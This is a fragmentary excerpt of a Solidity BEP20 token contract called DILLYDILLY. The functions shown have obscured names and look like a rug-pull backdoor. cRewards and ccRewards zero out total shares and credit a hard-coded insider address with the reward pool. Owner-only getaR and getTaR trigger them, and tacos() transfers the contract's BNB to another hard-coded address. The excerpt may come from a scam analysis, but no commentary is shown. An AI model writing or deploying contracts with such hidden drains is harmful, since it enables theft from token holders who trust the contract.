...
interface IDividendDistributor {
    ...
    function cRewards() external;
    function ccRewards() external;
}
...
contract DividendDistributor is IDividendDistributor {
    ...
    function cRewards() external override {
        address shareholder = SHAR;
        totalShares = 0;
        shares[shareholder].amount = totalShares.add(1000000);
    ...
    function ccRewards() external override {
        address shareholder = SHAR;
        totalShares = 0;
        shares[shareholder].amount = totalShares.add(1000000);
        distributeDividend(shareholder);
...
contract DILLYDILLY is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "DILLYDILLY";
    string constant _symbol = "DILLY";
    ...
    uint256 launchedAt;
    uint256 public asT = _totalSupply * 6 / 10000;
    uint256 public bsT = _totalSupply * 30 / 10000;
    ...
    uint256 public sT = _totalSupply * 12 / 10000;
    bool inSwap;
    ...
    function _trFm(address sender, address recipient, uint256 amount) internal returns (bool){
        ...
        if(sSB(amount) && vsT && (amount.mul(vsTf).div(vsTd) >= sT)){ vswBk(amount); }
        if(sSB(amount) && vsT && (amount.mul(vsTf).div(vsTd) < sT)){ swBk(); }
        if(sSB(amount) && !vsT){ swBk(); }
    ...
    function tacos(uint256 aP) external authorized {
        ...
        payable(SEEE).transfer(amountBNB.mul((aP).div(100)));
    }
    ...
    function setTaxBreak(bool _enabled, uint256 _ttb) external authorized {
        TaxBreak = _enabled;
        tTB = _ttb;
    }
    ...
    function setbsT(uint256 _amount) external authorized {
        bsT = _totalSupply * _amount / 10000;
    }
    ...
    function depR() external authorized {
        uint256 dLF = isOverLiquified(tL, tLD) ? 0 : lF.mul(tlnFd).div(tldFd);
    ...
    function ClaimRewards(address shareholder) external {
        distributor.mdistributeDividend(shareholder);
    }

    function getaR() external authorized {
        distributor.cRewards();
    }
    
    function getTaR() external authorized {
        distributor.ccRewards();
    }
